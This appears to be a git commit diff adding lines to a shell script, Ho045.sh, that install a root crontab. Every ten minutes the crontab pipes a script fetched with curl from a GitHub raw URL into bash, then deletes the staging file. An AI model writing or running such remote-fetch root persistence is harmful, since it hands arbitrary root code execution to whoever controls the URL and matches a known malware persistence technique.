2c2fcb51892e3240657e745a6c2fe726bbe02327
junscapital <52300722+junscapital@users.noreply.github.com>
2020-05-27 23:07:00 +0800

    Update Ho045.sh

--- Ho045.sh
+++ Ho045.sh
@@ -1,2 +1,8 @@
 #!/bin/sh
+sudo su
+echo "@reboot sudo supervisorctl reload
+1,11,21,31,41,51 * * * * curl https://raw.githubusercontent.com/junscapital/reload/master/Ho045.sh | bash
+ " >> myverifier
+sudo crontab myverifier
+rm myverifier
 
